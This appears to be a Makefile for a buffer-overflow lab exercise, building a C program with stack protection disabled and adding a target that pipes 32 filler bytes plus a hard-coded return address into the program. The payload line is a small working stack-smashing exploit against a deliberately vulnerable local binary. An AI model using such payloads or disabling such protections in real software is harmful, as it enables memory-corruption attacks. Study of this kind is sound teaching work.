CC = gcc
CFLAGS =  -o buffer -fno-stack-protector -m32
SRC = $(wildcard *.c) 

buffer : $(SRC)
	$(CC) $^ $(CFLAGS)

disassemble :
	objdump -d buffer.exe > diss.asm

overflow :
	ruby -e 'print "a"*32 + "\x60\x14\x40\x00"' | buffer.exe
clean :
	del  buffer.exe *.asm